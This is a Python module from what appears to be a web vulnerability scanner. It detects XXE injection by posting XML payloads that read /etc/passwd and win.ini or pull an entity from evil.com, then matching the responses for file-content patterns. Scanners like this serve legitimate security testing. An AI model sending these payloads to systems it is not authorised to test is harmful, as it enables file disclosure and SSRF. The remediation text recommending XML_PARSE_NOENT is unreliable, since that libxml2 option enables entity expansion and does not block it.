#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XXE XML外部实体检测器 - 检测XML解析端点的外部实体注入漏洞
"""

import re
from typing import Dict, List, Optional
from core.config import VULN_CONFIG
from core.detectors.base import BaseDetector


class XXEDetector(BaseDetector):
    """XXE XML外部实体检测器"""
    
    def __init__(self, target: str, http, urls: Optional[List] = None,
                 forms: Optional[List] = None, params: Optional[List] = None,
                 api_endpoints: Optional[List] = None, **kwargs):
        """
        初始化XXE检测器
        
        Args:
            target: 扫描目标URL
            http: HTTP工具实例
            urls: 爬虫发现的URL列表
            forms: 爬虫发现的表单列表
            params: 发现的参数列表
            api_endpoints: API端点列表
        """
        super().__init__(target, http, urls=urls, forms=forms, params=params,
                         api_endpoints=api_endpoints, **kwargs)
        self.name = "XXE(XML外部实体注入)"
        
        config = self._load_vuln_config('xxe')
        self.payloads = config.get('payloads', [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://evil.com">]><data>&file;</data>',
        ])
        
        # XXE特征匹配
        self.xxe_patterns = [
            r'root:x:',
            r'daemon:x:',
            r'\[boot loader\]',
            r'\[fonts\]',
            r'\[extensions\]',
            r'127\.0\.0\.1\s+localhost',
        ]
    
    def scan(self) -> List[Dict]:
        """
        扫描XXE漏洞
        
        Returns:
            发现的漏洞列表
        """
        vulnerabilities = []
        
        self.logger.info("开始XXE漏洞检测...")
        
        # 发现XML端点
        xml_endpoints = self._find_xml_endpoints()
        
        # 测试XML端点
        for url in xml_endpoints:
            vulns = self._test_basic_xxe(url)
            vulnerabilities.extend(vulns)
        
        # 测试POST表单
        for form in self.forms[:10]:
            if form.get('method', 'GET').upper() == 'POST':
                vulns = self._test_form(form)
                vulnerabilities.extend(vulns)
        
        return self._deduplicate_vulns(vulnerabilities)
    
    def _find_xml_endpoints(self) -> List[str]:
        """发现可能的XML端点"""
        xml_endpoints = []
        
        for url in self.urls[:50]:
            if self._is_xml_endpoint(url):
                xml_endpoints.append(url)
        
        # 添加API端点
        for endpoint in self.api_endpoints[:20]:
            url = endpoint.get('url', '')
            if url and self._is_xml_endpoint(url):
                xml_endpoints.append(url)
        
        return xml_endpoints
    
    def _is_xml_endpoint(self, url: str) -> bool:
        """判断端点是否可能接受XML"""
        url_lower = url.lower()
        xml_indicators = ['.xml', 'api', 'soap', 'xmlrpc', 'webhook', 'rss', 'feed', 'rest']
        return any(indicator in url_lower for indicator in xml_indicators)
    
    def _test_basic_xxe(self, url: str) -> List[Dict]:
        """基础XXE检测"""
        vulnerabilities = []
        
        for payload in self.payloads:
            try:
                response = self.http.post(
                    url,
                    data=payload,
                    headers={
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml, text/xml, */*'
                    }
                )
                
                if response and self._check_xxe_response(response.text):
                    vulnerabilities.append({
                        'type': 'XXE(XML外部实体注入)',
                        'severity': '高危',
                        'url': url,
                        'parameter': 'POST Body',
                        'method': 'POST',
                        'payload': payload[:100] + '...',
                        'description': f'端点 {url} 存在XXE漏洞,可能读取系统文件或发起SSRF攻击',
                        'recommendation': '禁用XML外部实体处理。禁用DTD。使用JSON代替XML。配置XML解析器拒绝外部实体。使用libxml2的XML_PARSE_NOENT选项'
                    })
                    break  # 发现漏洞后停止测试当前URL
            
            except Exception as e:
                self.logger.debug(f'XXE测试失败: {url}, 错误: {str(e)}')
        
        return vulnerabilities
    
    def _test_form(self, form: Dict) -> List[Dict]:
        """测试表单的XXE漏洞"""
        vulnerabilities = []
        
        form_action = form.get('action', self.target)
        inputs = form.get('inputs', [])
        
        # 检查表单是否可能接受XML
        enctype = form.get('enctype', '')
        if 'xml' in enctype.lower():
            # 构建XML payload
            for payload in self.payloads[:2]:
                try:
                    response = self.http.post(
                        form_action,
                        data=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if response and self._check_xxe_response(response.text):
                        vulnerabilities.append({
                            'type': 'XXE(XML外部实体注入)',
                            'severity': '高危',
                            'url': form_action,
                            'parameter': 'POST Body',
                            'method': 'POST',
                            'payload': payload[:100] + '...',
                            'description': f'表单 {form_action} 存在XXE漏洞',
                            'recommendation': '禁用XML外部实体处理。配置XML解析器拒绝外部实体。使用JSON格式代替XML'
                        })
                        break
                except Exception as e:
                    self.logger.debug(f'表单XXE测试失败: {form_action}, 错误: {str(e)}')
        
        return vulnerabilities
    
    def _check_xxe_response(self, response_text: str) -> bool:
        """检查响应中是否包含XXE成功利用的特征"""
        if not response_text:
            return False
        
        for pattern in self.xxe_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
